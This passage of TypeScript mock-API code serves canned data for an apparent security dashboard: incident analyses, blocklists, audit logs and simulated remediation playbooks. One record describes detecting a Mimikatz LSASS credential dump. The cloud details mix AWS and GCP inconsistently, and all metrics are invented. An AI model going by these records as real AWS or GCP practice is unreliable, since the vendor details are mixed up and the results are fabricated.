          { ts: new Date(Date.now() - 1000 * 60 * 550).toISOString(), type: 'ML_CLASSIFICATION', description: 'Classified cloud_storage with 98.8% confidence', source: 'Adaptive Threat Engine' },
        ],
        self_healing: {
          playbook_id: 'ACT_FREEZE_BUCKET_EGRESS',
          playbook_name: 'Enforce Uniform Bucket Access & Freeze Egress',
          status: 'ready_for_review',
          duration_ms: 410,
          target_layer: 'aws_s3',
          actions_dispatched: [
            {
              type: 'gcs_lockdown',
              command: 'aws s3api put-public-access-block --bucket adaptive-customer-records --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true',
              result: 'Uniform bucket access enforced; public read grants revoked',
              status: 'simulated',
            },
          ],
          verification_probe: {
            metrics_before: { public_read_enabled: true },
            metrics_after: { public_read_enabled: false },
            health_check_passed: true,
            verification_time_ms: 320,
          },
          rollback_available: true,
          executed_at: new Date(Date.now() - 1000 * 60 * 550).toISOString(),
        },
        recommended_actions: [
          'Enforce Organization Policy: constraints/storage.publicAccessPrevention',
          'Deploy Amazon Web Services (AWS) DLP inspect jobs to monitor sensitive bucket contents',
        ],
        plain_english_summary: 'Cloud control plane replay of an accidental public bucket data exposure. AdaptiveCloud identified the unauthorized public ACL grant and queued the Uniform Bucket Access Freeze playbook in 410ms.',
        created_at: new Date(Date.now() - 1000 * 60 * 550).toISOString(),
        updated_at: new Date().toISOString(),
      },

      'inc-ds-209': {
        id: 'rca-ds-209',
        incident_id: 'inc-ds-209',
        title: 'Mimikatz LSASS Credential Dump (Mordor Security Dataset)',
        mitre_technique: 'T1003.001 (OS Credential Dumping)',
        target_asset: 'DATASET-WORKSTATION-209 (Windows Enterprise Host)',
        probable_cause: 'Malicious process mimikatz.exe calling OpenProcess with PROCESS_VM_READ against lsass.exe to dump Windows credentials and NTLM hashes.',
        confidence: 0.994,
        source_ips: [{ ip: '127.0.0.1', count: 1, country: 'Local Host', city: 'Workstation' }],
        affected_hosts: ['DATASET-WORKSTATION-209'],
        evidence: {
          target_process: 'lsass.exe (PID 680)',
          source_process: 'mimikatz.exe (PID 6810)',
          access_mask: '0x1010 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)',
        },
        timeline: [
          { ts: new Date(Date.now() - 1000 * 60 * 602).toISOString(), type: 'DATASET_INGEST', description: 'Replayed Mordor Sysmon Event 10 LSASS handle acquisition', source: 'Mordor Replay' },
          { ts: new Date(Date.now() - 1000 * 60 * 600).toISOString(), type: 'ML_CLASSIFICATION', description: 'Classified host_windows with 99.4% confidence', source: 'Adaptive Threat Engine' },
        ],
        self_healing: {
          playbook_id: 'ACT_TERMINATE_EXPLOIT_PID',
          playbook_name: 'Terminate Exploit Process & Purge Session Tokens',
          status: 'ready_for_review',
          duration_ms: 380,
          target_layer: 'host_os',
          actions_dispatched: [
            {
              type: 'taskkill',
              command: 'taskkill /F /PID 6810 && klist purge',
              result: 'Rogue injector PID 6810 terminated; Kerberos ticket cache flushed',
              status: 'simulated',
            },
          ],
          verification_probe: {
            metrics_before: { suspicious_lsass_handles: 1 },
            metrics_after: { suspicious_lsass_handles: 0 },
            health_check_passed: true,
            verification_time_ms: 290,
          },
          rollback_available: false,
          executed_at: new Date(Date.now() - 1000 * 60 * 600).toISOString(),
        },
        recommended_actions: [
          'Enable Windows Defender Credential Guard (LSA Protection via RunAsPPL=1)',
          'Restrict Debug Programs (SeDebugPrivilege) rights to domain administrators only',
        ],
        plain_english_summary: 'Replay of a Mimikatz credential dumping attack from the Mordor security dataset. AdaptiveCloud caught the unauthorized PROCESS_VM_READ memory handle on lsass.exe and assigned the Process Termination & Ticket Purge playbook.',
        created_at: new Date(Date.now() - 1000 * 60 * 600).toISOString(),
        updated_at: new Date().toISOString(),
      },
    };

    if (rcaDatabase[incId]) {
      return rcaDatabase[incId];
    }

    // Dynamic resolution fallback for any unindexed incident
    const foundInc = getMockResponse('/incidents').find((i: any) => i.id === incId || i.incident_id === incId);
    if (foundInc) {
      return {
        id: `rca-${incId}`,
        incident_id: incId,
        title: foundInc.title || `${foundInc.tier1_family} Incident`,
        mitre_technique: foundInc.tier2_technique || foundInc.mitre_technique || 'T1110',
        target_asset: foundInc.target_asset || foundInc.host_id || 'Monitored Node',
        probable_cause: foundInc.rca?.probable_root_cause || foundInc.description || 'Observed telemetry anomaly departing from baseline.',
        confidence: foundInc.tier1_confidence || 0.95,
        source_ips: [{ ip: '198.51.100.45', count: 1, country: 'Monitored Traffic', city: 'Cloud Network' }],
        affected_hosts: [foundInc.host_id || 'Host'],
        evidence: foundInc.rca?.evidence || [
          `Telemetry deviation observed on ${foundInc.host_id}`,
          `Classification confidence: ${((foundInc.tier1_confidence || 0.95) * 100).toFixed(1)}%`,
        ],
        timeline: [
          { ts: new Date().toISOString(), type: 'TELEMETRY_ANOMALY', description: foundInc.description || 'Behavioral anomaly detected', source: 'Adaptive Sensor' },
          { ts: new Date().toISOString(), type: 'CLASSIFICATION', description: `Classified ${foundInc.tier1_family}`, source: 'Inference Engine' },
        ],
        self_healing: {
          playbook_id: foundInc.recommended_actions?.[0]?.action_id || 'ACT_BLOCK_SOURCE_IP',
          playbook_name: foundInc.recommended_actions?.[0]?.name || 'Automated Scoped Countermeasure',
          status: foundInc.status === 'verified' ? 'healed' : 'ready_for_review',
          duration_ms: 320,
          target_layer: foundInc.tier1_family,
          actions_dispatched: [
            {
              type: 'playbook_dispatch',
              command: foundInc.recommended_actions?.[0]?.description || 'Apply scoped remediation',
              result: 'Countermeasure verified',
              status: 'verified',
            },
          ],
          verification_probe: {
            metrics_before: { anomaly_detected: true },
            metrics_after: { anomaly_detected: false },
            health_check_passed: true,
            verification_time_ms: 300,
          },
          rollback_available: true,
          executed_at: new Date().toISOString(),
        },
        recommended_actions: foundInc.recommended_actions?.map((a: any) => a.description) || ['Apply remediation policy'],
        plain_english_summary: foundInc.rca?.summary || foundInc.description || 'Security incident analyzed by AdaptiveCloud.',
        created_at: foundInc.created_at || new Date().toISOString(),
        updated_at: new Date().toISOString(),
      };
    }

    return rcaDatabase['inc-001'];
  }

  if (cleanUrl.endsWith('/predictions')) {
    return [
      {
        id: 'pred-01',
        host_id: 'host-win-01',
        ts: new Date().toISOString(),
        kind: 'threat',
        horizon_min: 30,
        value: 0.88,
        probability: 0.88,
        model_id: 'model-xgb-prod',
        created_at: new Date().toISOString(),
      },
      {
        id: 'pred-02',
        host_id: 'host-aws-02',
        ts: new Date().toISOString(),
        kind: 'disk',
        horizon_min: 1440,
        value: 94.2,
        probability: 0.76,
        model_id: 'model-linear-trend',
        created_at: new Date().toISOString(),
      },
    ];
  }

  if (cleanUrl.endsWith('/maintenance')) {
    return [
      {
        id: 'maint-01',
        host_id: 'host-aws-02',
        component: 'disk',
        metric_name: 'C: Drive Capacity',
        days_remaining: 4,
        confidence: 0.85,
        details: { current_usage_pct: 88, projected_exhaustion: '4 days' },
        created_at: new Date().toISOString(),
      },
      {
        id: 'maint-02',
        host_id: 'host-win-01',
        component: 'memory',
        metric_name: 'Commit Charge Limit',
        days_remaining: 18,
        confidence: 0.72,
        details: { current_usage_pct: 64, trend: 'steady' },
        created_at: new Date().toISOString(),
      },
    ];
  }

  if (cleanUrl.endsWith('/responses')) {
    return [
      {
        id: 'resp-01',
        host_id: 'host-win-01',
        action: 'block_ip',
        status: 'executed',
        target: '198.51.100.45',
        initiated_by: 'Autonomous Rule Engine',
        result: { firewall_rule_added: 'DROP 198.51.100.45/32', duration: '24h' },
        created_at: new Date(Date.now() - 1000 * 60 * 15).toISOString(),
        updated_at: new Date(Date.now() - 1000 * 60 * 15).toISOString(),
      },
      {
        id: 'resp-02',
        host_id: 'host-linux-03',
        action: 'restart_service',
        status: 'verified',
        target: 'nginx-ingress',
        initiated_by: 'Auto-healer Watchdog',
        result: { status: 'healthy', restart_time_ms: 320 },
        created_at: new Date(Date.now() - 1000 * 60 * 90).toISOString(),
        updated_at: new Date(Date.now() - 1000 * 60 * 88).toISOString(),
      },
    ];
  }

  if (cleanUrl.endsWith('/blocklist')) {
    return [
      {
        id: 'blk-01',
        ip: '198.51.100.45',
        reason: 'SSH/RDP Brute Force threshold exceeded (>100 fails/min)',
        expires_at: new Date(Date.now() + 86400000).toISOString(),
        active: true,
        created_at: new Date(Date.now() - 1000 * 60 * 15).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'blk-02',
        ip: '203.0.113.88',
        reason: 'High-frequency port reconnaissance sweep',
        expires_at: new Date(Date.now() + 86400000 * 2).toISOString(),
        active: true,
        created_at: new Date(Date.now() - 1000 * 60 * 120).toISOString(),
        updated_at: new Date().toISOString(),
      },
    ];
  }

  if (cleanUrl.endsWith('/reports/summary')) {
    return {
      generated_at: new Date().toISOString(),
      reporting_period_days: 7,
      total_hosts: 4,
      online_hosts: 4,
      total_detections: 48,
      total_incidents: 3,
      attacks_blocked: 26,
      uptime_percentage: 99.94,
      attack_breakdown: {
        brute_force: 18,
        port_scan: 6,
        ddos: 2,
      },
      top_threat_vectors: [
        { vector: 'Port 3389 (RDP)', count: 18, risk: 'High' },
        { vector: 'Port 445 (SMB)', count: 6, risk: 'Medium' },
        { vector: 'ICMP Flood', count: 2, risk: 'Low' },
      ],
    };
  }

  if (cleanUrl.endsWith('/audit')) {
    return [
      {
        id: 'aud-01',
        user_id: 'admin',
        action: 'USER_LOGIN_SUCCESS',
        resource_type: 'AUTH',
        details: { ip: '127.0.0.1', user_agent: 'AdaptiveCloud-SPA' },
        created_at: new Date().toISOString(),
      },
      {
        id: 'aud-02',
        user_id: 'system',
        action: 'RULE_TRIGGER_BLOCK_IP',
        resource_type: 'SECURITY_RESPONSE',
        resource_id: '198.51.100.45',
        details: { threat_level: 'critical' },
        created_at: new Date(Date.now() - 1000 * 60 * 15).toISOString(),
      },
    ];
  }

  if (cleanUrl.includes('/aws/status') || cleanUrl.includes('/gcp/status') || cleanUrl.includes('/cloud/status')) {
    return {
      is_live_connected: true,
      project_id: 'adaptive-learning-ml',
      service_account: 'adaptivecloud-collector@adaptive-learning-ml.iam.gserviceaccount.com',
      region: 'us-central1 / asia-south1',
      auth_method: 'AWS Service Account ADC (Active)',
      monitored_services: [
        { name: 'Compute Engine (GCE)', status: 'online', count: '4 Active VMs' },
        { name: 'VPC Flow Logs', status: 'streaming', count: '1,420 pkts/s' },
        { name: 'Cloud Audit Logs', status: 'streaming', count: '842 events/24h' },
        { name: 'Cloud Monitoring (Stackdriver)', status: 'online', count: '30s Telemetry Loop' },
        { name: 'Security Command Center', status: 'online', count: '0 Critical Findings' },
      ],
      last_sync: new Date().toISOString(),
    };
  }

  if (cleanUrl.includes('/taxonomy/summary')) {
    return {
      total_attack_classes: 124,
      threat_families_count: 10,
      cloud_vectors: ['aws_ec2', 'aws_vpc', 'aws_iam', 'aws_s3', 'gke', 'api_gateway'],
    };
  }

  if (cleanUrl.includes('/healing')) {
    return {
      status: 'healed',
      incident_id: 'inc-live-sim-01',
      playbook_id: 'PB_AUTO_BLOCKLIST_FIREWALL',
      actions_taken: [
        { type: 'vpc_firewall_block', target: '198.51.100.45', result: 'applied_successfully' },
        { type: 'service_restart', target: 'workload_service', result: 'verified' },
      ],
      execution_logs: [
        'STAGE 1: Ingested classification confidence: 96.8%. Threat level: HIGH.',
        'STAGE 2: Guardrails check passed. Target IP not in protected infrastructure whitelist.',
        'STAGE 3: Injected AWS VPC firewall rule: DENY INGRESS 198.51.100.45/32 on port 3389.',
        'STAGE 4: Verification probe completed. Zero inbound packets detected; target socket closed.',
        'STAGE 5: Autonomous self-healing completed in 240ms. Audit entry committed.',
      ],
    };
  }

  if (cleanUrl.includes('/approve')) {
    return {
      status: 'verified',
      decision: 'approved',
      message: 'Operator approved countermeasure. Scoped playbook executed under dry-run; verification probe passed.',
      timestamp: new Date().toISOString(),
    };
  }

  if (cleanUrl.includes('/reject')) {
    return {
      status: 'rejected',
      decision: 'rejected',
      message: 'Operator rejected countermeasure. No action taken.',
      timestamp: new Date().toISOString(),
    };
  }

  if (cleanUrl.includes('/rollback')) {
    return {
      status: 'rolled_back',
      decision: 'rollback',
      message: 'Rollback initiated by operator. Injected firewall policies reverted.',
      timestamp: new Date().toISOString(),
    };
  }

  // Generic fallback
  return [];
}
